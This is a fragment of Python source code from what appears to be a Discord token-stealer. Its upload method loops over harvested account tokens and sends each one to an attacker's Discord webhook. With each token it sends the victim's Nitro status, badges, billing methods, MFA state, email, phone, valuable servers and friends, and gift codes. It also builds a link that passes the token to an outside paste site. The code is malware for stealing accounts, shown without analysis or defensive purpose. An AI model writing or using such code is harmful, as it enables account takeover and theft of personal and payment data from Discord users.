...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.add_field(name="<:vaim:1076966140795949166> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
            embed.add_field(name="<a:0blackxwhiteflash:1076966520372088862> Nitro:", value=f"{nitro}", inline=True)
            embed.add_field(name="<a:kaji_a_boost:1076966138761715712> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_field(name="<a:EX_creditcard:1076965949275656193> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
            embed.add_field(name="<:CLY_bow:1076967455538298890> MFA:", value=f"{mfa}", inline=True)

            embed.add_field(name="\u200b", value="\u200b", inline=False)
            
            embed.add_field(name="<:CLY_blackcat:1076967457329250354> Email:", value=f"{email if email != None else 'None'}", inline=True)
            embed.add_field(name="<:yheart:1076967453395001517> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    

            embed.add_field(name="\u200b", value="\u200b", inline=False)

            if hq_guilds != None:
                embed.add_field(name="<a:1_dance:1076966523551355020> HQ Guilds:", value=hq_guilds, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)
           
            if hq_friends != None:
                embed.add_field(name="<a:a_desespero:1075129489400541254> HQ Friends:", value=hq_friends, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            if codes != None:
                embed.add_field(name="<:4p_nazi:1076967459384459385> Gift Codes:", value=codes, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.set_footer(text="www.youtube.com/@spoofingesq")

            self.webhook.send(embed=embed, username="Ximenito", avatar_url="https://media.discordapp.net/attachments/1076348602387017838/1076965642034491442/IMG_9725.jpg")